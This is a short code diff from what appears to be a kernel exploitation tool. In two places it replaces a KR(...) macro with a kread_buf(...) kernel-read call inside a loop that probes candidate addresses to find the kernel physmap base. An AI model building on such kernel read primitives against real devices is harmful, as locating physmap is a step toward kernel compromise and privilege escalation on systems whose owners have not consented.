@@ -1106,7 +1106,7 @@ static void *scan_loop(void *arg) {
         for (int ci = 0; ci < 4 && !g_physmap_base; ci++) {
             uint64_t b = cb[ci];
             uint32_t magic = 0;
-            KR(g_h, b + 0x1000, &magic, 4);
+            kread_buf(b + 0x1000, &magic, 4);
             fprintf(stderr, "[kcd] physmap try %llx magic=%x\n",
                     (unsigned long long)b, magic);
             if (magic != 0 && magic != 0xFFFFFFFF) {
@@ -1139,7 +1139,7 @@ static void *scan_loop(void *arg) {
                 for (int ci = 0; ci < 3 && !g_physmap_base; ci++) {
                     uint64_t b = cb2[ci];
                     uint32_t magic = 0;
-                    KR(g_h, b + 0x1000, &magic, 4);
+                    kread_buf(b + 0x1000, &magic, 4);
                     if (magic != 0 && magic != 0xFFFFFFFF) {
                         g_physmap_base = b;
                         break;
